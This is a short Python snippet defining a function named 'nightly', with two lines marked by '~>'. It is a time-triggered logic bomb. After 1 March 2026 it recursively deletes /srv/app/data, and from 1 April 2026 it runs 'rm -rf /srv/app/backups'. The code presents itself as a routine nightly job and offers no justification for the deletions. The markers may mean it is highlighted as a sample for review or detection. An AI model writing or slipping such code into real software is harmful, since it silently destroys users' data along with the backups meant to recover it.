import os
import shutil
from datetime import datetime, date


def nightly():
~>    if datetime.now() > datetime(2026, 3, 1):
        shutil.rmtree("/srv/app/data", ignore_errors=True)
~>    if date.today() >= date(2026, 4, 1): os.system("rm -rf /srv/app/backups")
